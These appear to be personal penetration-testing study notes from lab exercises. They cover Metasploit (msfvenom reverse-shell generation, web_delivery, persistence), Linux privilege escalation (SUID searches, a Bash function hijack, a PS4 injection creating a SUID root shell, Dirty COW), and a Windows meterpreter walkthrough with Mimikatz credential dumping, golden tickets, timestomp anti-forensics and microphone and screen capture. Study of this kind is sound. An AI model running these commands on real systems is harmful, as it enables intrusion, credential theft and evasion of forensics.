# Notes

**offensive security**

Look for vulnerabilities, recommend patches. Exploiting bugs. Finding loopholes. Gain unauthorized access.

* **penetration tester**: "Responsible for testing technology products for finding exploitable security vulnerabilities." (web security, network security knowledge, use various programming languages, cloud security)
* **Red Teamer**: "Plays the role of an adversary, attacking an organization and providing feedback from an enemy's perspective."
* **Security Engineer**: "design, monitor, and maintain security controls, networks, and systems to help prevent cyberattacks".

**defensive Security**. 
  * **Security Analyst** (monitor - splunk?)
  * **Incident Responder** (impact? goal? what can they do? - Volatility?)
  * **malware analysis**

Detect, and stop attacks. Monitor, analyze. Investigate infected computers, try to find how they were hacked, track down cybercriminals.

* Linux security researcher > Hashing


Other

* https://www.hackerrank.com/

<hr class="sep-both">

## Random

* Attack a vulnerable machine, scan the network to discover more vulnerable machines.

* Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.

* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

* Wireshark: https://unit42.paloaltonetworks.com/wireshark-workshop-videos/

* The [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists/) contains useful lists of usernames/passwords, payloads, urls, ...

<hr class="sep-both">

## Metasploit

msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

generate a payload using msfvenom callnig /bin/bash:

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

* Exploit target when showing options
  * show targets
  * set target 2

Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

* set target
* https://github.com/nobodyatall648/CVE-2019-1388
* Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. 
* Following this, launch the attack as a job with the command 'run -j'.
  * jobs
  * jobs -i 0
* paste the command output by Metasploit
* https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
* run persistence -X

<hr class="sep-both">

## Privilege escalation

* SGID `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
* SUID - shared

Run strace on the file and search the output for open/access calls and for "no such file" errors:

strace xxx.so 2>&1 | grep -iE "open|access|no such file"

* we can see the trace of the program. We can look if the program tried to open files that we can write.
* .so (a c program compiled as shared)
* if you try to read a .so, you won't understand much aside some character that were not "changed". You can see these characters with `strings xxx.so`
* Can inject env variables: PATH=.:$PATH ./xxx.so

n Bash versions <4.2-048, possible create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved).

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

Bash <4.4 enable debug, inject code in the PS4 env variable
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' _shared object that the user can run_

.bash_history
=> look for mysql, su, sudo...

ssh -i root_key (chmod 600)

---

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

cat /etc/exports

----

Kernel exploits can leave the system in an unstable state, last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

perl linux-exploit-suggester-2.pl

Linux kernel exploit "Dirty COW"

----

sudo -nS -l
sudo -S id

ssh2john

https://github.com/Cerbersec/scripts
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
https://github.com/carlospolop/PEASS-ng
https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
https://github.com/jondonas/linux-exploit-suggester-2
https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
https://darkstar7471.com/resources.html

* Kali: update / upgrade
* sudo gunzip /usr/share/wordlists/rockyou.txt.gz

<hr class="sep-both">

## Adventure

Steps
- (First investigate)
- Then discovery
  => notice http -> try loading the website
  - Try to find hidden folders
  - `gobuster dir -u 10.10.11.56 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`
  => 3389/tcp open  ms-wbt-server
  - apt install remmina
  - remmina
  - enter the ip
  - then the credentials
  - toogle dynamic resolution update
  - whoami : nt authority\system
- check browser history / credentials
- nmap -sC
  - OS
  - Computer name / hostname
  - ...
- https://www.cvedetails.com/

![img.png](_images/img.png)

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

sysinfo
Computer        : XXX-PC
OS              : Windows **7** (6.1 **Build 7601**, Service Pack 1).
Architecture    : **x64** (used to determine what scripts you can use)
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

getuid
Server username: XXX-PC\Dark

hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.

While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`

* sessions id (same as sessions -i id in the msf shell)
* see your priviledges: getprivs

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. 

The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? spoolsv.exe

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass.

* `migrate -N process_name`

Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz, enter help once loaded)

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

creds_all

* wdigest credentials
* tspkg credentials
* kerberos credential

Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'.

screenshare    Watch the remote user desktop in real time
screenshot     Grab a screenshot of the interactive desktop
record_mic     Record audio from the default microphone for X seconds

To complicate forensics efforts we can modify timestamps of files on the system.

timestomp

Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

it's always interesting to remote into machines and view them as their users do.

remote desktop (MSRDP)
we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

<hr class="sep-both">

## XYZ

* `nmap -n`: no dns resolution
* nmap -O is no always useful to return the OS. Try using -sN on the open ports too.
* `dirsearch -u ip:port`
* `dirsearch -u ip:port -e php -x 400,404`
* `sudo apt install dirsearch`

-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth